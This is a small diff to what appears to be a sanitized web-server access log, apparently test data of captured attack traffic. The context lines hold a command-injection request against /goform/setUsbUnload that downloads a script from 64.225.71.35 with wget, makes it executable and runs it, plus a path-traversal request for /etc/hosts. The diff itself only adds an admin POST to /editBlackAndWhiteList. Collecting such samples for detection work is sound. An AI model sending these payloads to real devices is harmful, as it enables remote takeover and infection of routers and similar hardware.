@@ -2286,3 +2286,4 @@ Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "POST 
 Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "POST /functionRouter HTTP/1.1" 400 650 "-" "-" "-"
 Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "GET /goform/setUsbUnload/.js?deviceName=A;cd%20/tmp%3Brm%20lilin.sh%3Bwget%20http%3A//64.225.71.35/scripts/lilin.sh%3Bchmod%20777%20lilin.sh%3B./lilin.sh HTTP/1.1" 301 162 "-" "-" "-"
 Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts HTTP/1.1" 400 150 "-" "-" "-"
+Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - admin [01/Jan/1970:00:00:00:00 +0000] "POST /editBlackAndWhiteList HTTP/1.1" 301 162 "-" "-" "-"
